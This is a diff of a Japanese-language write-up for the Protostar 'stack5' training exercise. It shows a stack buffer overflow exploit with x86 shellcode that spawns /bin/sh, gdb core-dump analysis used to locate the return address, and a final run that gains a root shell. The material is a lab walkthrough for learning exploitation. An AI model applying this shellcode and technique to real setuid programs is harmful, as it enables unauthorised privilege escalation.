@@ -238,7 +238,7 @@ kernel.core_pattern = core.%s.%e.%p
 # sysctl -w fs.suid_dumpable=2
 fs.suid_dumpable = 2
 # exit
-$ /opt/protostar/bin/stack5 <<< $(python -c 'print "A"*76 + "\xe0\xd0\xff\xbf" + "\x90"*2048 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
+$ /opt/protostar/bin/stack5 <<< $(python -c 'print "A"*76 + "\xef\xbe\xad\xde" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
 Segmentation fault (core dumped)
 $ ls
 core.11.stack5.2416
@@ -246,5 +246,31 @@ $ su
 Password: godmode
 # chmod -v 0666 ./core.11.stack5.2416
 mode of `core.11.stack5.2416' changed to 0666 (rw-rw-rw-)
-root@protostar:/tmp/tmp.tQ4Q1WRO1K# exit
+# exit
+$ gdb -q /opt/protostar/bin/stack5 ./core.11.stack5.2416
+GNU gdb (GDB) 7.0.1-debian
+
+Program terminated with signal 11, Segmentation fault.
+#0  0xbfffef38 in ?? ()
+(gdb) x/32x $esp-16
+0xbffff6c0:	0x41414141	0x41414141	0x41414141	0xdeadbeef
+0xbffff6d0:	0xdb31c031	0x80cd06b0	0x742f6853	0x2f687974
+0xbffff6e0:	0x89766564	0x66c931e3	0xb02712b9	0x3180cd05
+0xbffff6f0:	0x2f6850c0	0x6868732f	0x6e69622f	0x5350e389
+0xbffff700:	0xb099e189	0x0080cd0b	0x00000000	0x00000000
+0xbffff710:	0xbffff748	0xfe918d38	0xd4c45b28	0x00000000
+0xbffff720:	0x00000000	0x00000000	0x00000001	0x08048310
+0xbffff730:	0x00000000	0xb7ff6210	0xb7eadb9b	0xb7ffeff4
 ```
+
+この結果より、`$eip`を`0xbffff6d0`に書き換えればshellが起動する
+
+```shell
+$ /opt/protostar/bin/stack5 <<< $(python -c 'print "A"*76 + "\xd0\xf6\xff\xbf" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
+# whoami
+root
+# id
+uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+```
+
+# 付録: NOP sledを使ったやり方について
